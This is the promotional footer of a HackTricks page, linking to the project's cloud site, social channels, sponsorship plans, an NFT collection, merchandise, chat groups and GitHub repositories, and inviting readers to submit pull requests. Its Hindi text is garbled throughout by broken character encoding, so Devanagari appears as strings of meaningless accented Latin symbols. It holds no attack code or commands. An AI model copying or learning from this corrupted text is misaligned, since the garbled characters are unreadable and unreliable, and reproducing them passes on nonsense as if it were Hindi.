<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT рд╕рдВрдЧреНрд░рд╣**](https://opensea.io/collection/the-peass-family) рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛред**

</details>
